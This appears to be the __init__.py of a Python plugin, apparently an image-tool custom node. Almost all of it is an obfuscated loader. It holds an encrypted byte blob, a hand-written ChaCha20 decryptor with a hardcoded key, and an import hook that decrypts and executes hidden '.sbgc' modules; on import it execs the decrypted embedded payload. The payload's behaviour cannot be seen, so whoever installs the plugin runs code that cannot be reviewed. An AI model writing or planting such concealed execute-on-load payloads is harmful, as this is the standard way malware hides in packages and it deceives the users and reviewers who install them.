
import hashlib as _h
import hmac as _hm
import importlib.abc as _ia
import importlib.util as _iu
import os as _os
import struct as _struct
import sys as _s
import zlib as _z
from pathlib import Path as _P
_MAGIC = b"SBGHPUB2"
_SECRET = _h.sha256(b"SHAOBKJ_GITHUB_PUBLISH_2026_V2").digest()
_PLUGIN_DIR = _P(__file__).resolve().parent
_INIT_PAYLOAD = b'SBGHPUB2&\x8a76\xe9\xc6\x81i\xa7\x12\xf0?;\xbd0\xeb\x88\xc9)\xee\xbd\xa0\xdc0\x9b\xd1\x0b\x83\xfaM\xad0^\xaf\x95\xab\x98\x82\x82\xc2\xedVr\x15\x97^R\xcf\xd01\xb9lMyo?\xb7Ro\xf74\x1b\xaal\x83\xe9bON\'\xb2\xde\xcc\x9fb\x92\xdb\x98\xf9\xa2\x8cu\xa5\x9f\x11)\x9f|\x1d\xad\xea4p\xe0\x08\x9e\xda\x0f\x8fW\xcb@\xe1\xf2x\x12V\x19\xb5R\xcd\xfd\x87d*yp\xc7\xad\x84*\xb8\x92\xc5u=\x00}\x82x>\xd6p\xb1C\xc8\x17c\x1c\xd2K\xc0\x98\xd1\xafn\xea\x93\x0e=\x1f\xe78\xc2\xebUp\x94\x9a\x1a\x0c\x8a\xcf^;\x83\x0f\x8a(\x12(\xb9\x97,\x1d\xab\xc7\x80\xb6Rp(\x17@U4\xf7\xd6R\xec\'\xe9\xe3a\x8d\xc3\x18BQ\x0f\xadA\x90\x80#\xcf<\x1e\x1ej\x93}|\xae{\xfb\x131S\x03K\xfe\xfa\x04>%=0lp\xe7{\xf9z\xd7\xaf\xfbo!\x7f\xc4\x1b\x0c\x9dm\xbf\xber\xa0|\x87k(\x9ew\xea\x1dO\xfa8F\xf6\xdb\xbf6\x8c\xd5\xe6\x14\xad\x19\x1a\x16\xe8l\xb7\xc7\x0eo\xd3\xa4\x0e\x98\xc7qT`\xe2\x07R\xc0(\x00L\x9a\xbb\xc86v\xf5\xcfE=:\x1eb\xf4\xde\xbd\xab\xaf9\xe6,\x11S\x1d\t\xb7\xf4\x7f\xe6\x05\xa4US!\xba[\xffB4B8*\xf0\x14\xbd\x08\x1aw\xd5x>\x1e0_tp"5\xfa\x1f\xb53?\xa9A\xec\xce\xe4\xc9uP}\xc0#\xe8\x10\xe1\xde\x89\x83\xd8\xa7\xbe\xec\xac\xcd`\x07\x96#t\xeehd\xc7\xb9\x9d\x14\x9bW\xa0\x0c!\x95\xc8\x9b\xa2\xcd{\xd5W\xabX\x98P\xebZi\r\x89\xd3\xd0i\x1b\xf6W\xe0\x1cz\xfb\xdf\xf6_\x90.5\xde\xe3[\x02S\xd7X\xc9K\xc5\x8e\xb5`D\x80\xb8Rf\x12\xb4\xf3\x18\xd8hY\xc7\x9e\xfe7m@\xc6\x0bE#\xbb\xd5\xf1\x13\x9d\x06\x0b\xa6f\x19\x06\x94O\x8de\xfao\r1j\xbeA\x17`L\xa5\x9e\xe4\xea\xbeoE\xb6\x01\x8c\xa8\x00\xeb8 \xe0\x14\xefG\xfabQG\xefR\xf1\x8efX\xd8\xbcqS-\xb0\x91=\x1a\xd4`!e\xf7{;\xe0\x1d\xd0\xcf\xa3\xbere\xada\xf7Y*VEM5\xcdS\x18\x99\xfe1?\x96\x19\x8d\x8d\x9b\x1a\x0f\xad\x0fB\xab\xb9L\xe1\xdc\x14\xbe!\xeb(G\xef\xeaH\xf2\x01:\x06:\x9dwKM\xfe\x8b\x94\xb9\xe2w\x92;)\x8b\x8a\x14\xd3\xaf+\xa4\xd7c\xb1\x0c\xe9\xc8\x9e\xdb\x1e*`\xad\x9eW\x8c\x85p\xca\x95\xa9\x1a( \x88\xb2\x8c\xa9\x8fA\x95R\x01\x05*eM\x7fE\x97\x1a\n\x05N\x10\xbf\x99-)*B\xd4\x89\xa6\x13\xc0\xf6D\x05\xf7\x86\xc6d\x8c\x84\x88\xe5\x98n\x12\x93:\xb0\xb1\xe1\xc3-^\x8b\xc9\x95~Ws`\xd4h\x9c\xf9\x10\xf5\x8avC\xfd\xde\xe2\x00\xca\xeb\x9b(\t\xd0eq\xb0>\xec\x898O^\xd8\x11\xebu\x8d\x9f\xa2\x95\x1c\x13eQ\xa5\x0e\xe4\xd0I\x8e\xb7\xff\x8d<\xc7s\xdf\xd2\xa8g\xa5\'\x83\x9ezL\x9a\xe4o\xc6\x88\x1c\xbf\xfc\x15\x15\xe8j\xdey\xa4\xdet\x1c\xf0\x94\x94\xac4B\x7f\xc1R\x1d\x18\xbc\xe2F\xbb\xe3\xff\'\x14\xddz\x08{e\xf0J\x8c;~\xdf\x85?\xacx\x94\xa9\xd3\x8d\x84\xc0T/\xd7U5\xda;2\x11\xfa\x04-\x1d\xc4\xb8\xfc\xd8V\xd0iF\xf2\x84\xd2\x1d(\xe6Ki\x86\xebHrv7\xe9%\xa9u\xff[\x1ck\xbfQ\xfc\xbb\x067\xc0.\xcd\x1f\xba(\x88\xfdD\xf9\x81 \xf0\x07\xf1\xc2\xd1\x0b\x8dz!\xcb\x06\xed)\xde\x125\xb4\xe6\xcf\x1c}\rv\xee[\xd0\xb8a\x17\x03V\x9d\xe96\x88z{\xf56e\x8a\x12\x8b\xb9Z\x1a\xc9\x8aP+7\xff\xdco\xc7\xf6\xc6`,\xee\xd7\xe2\xd1\x9e\xa5\xea'
def _rotl32(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
def _quarter_round(state, a, b, c, d):
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 12)
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 7)
def _chacha_block(key, nonce, counter):
    state = list(_struct.unpack("<4I", b"expand 32-byte k") + _struct.unpack("<8I", key) + (counter,) + _struct.unpack("<3I", nonce))
    working = state[:]
    for _ in range(10):
        _quarter_round(working, 0, 4, 8, 12); _quarter_round(working, 1, 5, 9, 13); _quarter_round(working, 2, 6, 10, 14); _quarter_round(working, 3, 7, 11, 15)
        _quarter_round(working, 0, 5, 10, 15); _quarter_round(working, 1, 6, 11, 12); _quarter_round(working, 2, 7, 8, 13); _quarter_round(working, 3, 4, 9, 14)
    return _struct.pack("<16I", *[((working[i] + state[i]) & 0xFFFFFFFF) for i in range(16)])
def _crypt(data, nonce):
    out = bytearray(); counter = 1
    for offset in range(0, len(data), 64):
        block = _chacha_block(_SECRET, nonce, counter); counter += 1
        chunk = data[offset:offset + 64]
        out.extend(value ^ block[index] for index, value in enumerate(chunk))
    return bytes(out)
def _decrypt_source(data):
    if not data.startswith(_MAGIC): raise ImportError("Invalid encrypted module.")
    nonce = data[len(_MAGIC):len(_MAGIC) + 12]; tag = data[len(_MAGIC) + 12:len(_MAGIC) + 44]; payload = data[len(_MAGIC) + 44:]
    expected = _hm.new(_SECRET, nonce + payload, _h.sha256).digest()
    if not _hm.compare_digest(tag, expected): raise ImportError("Encrypted module integrity check failed.")
    return _z.decompress(_crypt(payload, nonce)).decode("utf-8-sig").lstrip("\ufeff")
class _Loader(_ia.Loader):
    def __init__(self, fullname, path, is_package=False):
        self.fullname = fullname; self.path = path; self._is_package = is_package
    def create_module(self, spec): return None
    def is_package(self, fullname): return self._is_package
    def exec_module(self, module):
        source = _decrypt_source(self.path.read_bytes())
        module.__file__ = str(self.path); module.__loader__ = self; module.__cached__ = None
        module.__package__ = self.fullname if self._is_package else self.fullname.rpartition(".")[0]
        if self._is_package: module.__path__ = [str(self.path.parent)]
        exec(compile(source, str(self.path), "exec"), module.__dict__)
class _Finder(_ia.MetaPathFinder):
    def find_spec(self, fullname, path=None, target=None):
        prefix = __name__ + "."
        if not fullname.startswith(prefix): return None
        rel_path = fullname[len(prefix):].replace(".", _os.sep); base = _PLUGIN_DIR
        module_file = base / f"{rel_path}.py.sbgc"; package_file = base / rel_path / "__init__.py.sbgc"
        if module_file.is_file(): return _iu.spec_from_loader(fullname, _Loader(fullname, module_file), origin=str(module_file))
        if package_file.is_file():
            loader = _Loader(fullname, package_file, True)
            spec = _iu.spec_from_loader(fullname, loader, origin=str(package_file), is_package=True); spec.submodule_search_locations = [str(package_file.parent)]; return spec
        package_dir = base / rel_path
        if package_dir.is_dir():
            spec = _iu.spec_from_loader(fullname, loader=None, is_package=True); spec.submodule_search_locations = [str(package_dir)]; return spec
        return None
WEB_DIRECTORY = "web"
if not any(isinstance(f, _Finder) for f in _s.meta_path): _s.meta_path.insert(0, _Finder())
exec(compile(_decrypt_source(_INIT_PAYLOAD), str(_PLUGIN_DIR / "__init__.py"), "exec"), globals())
WEB_DIRECTORY = "web"

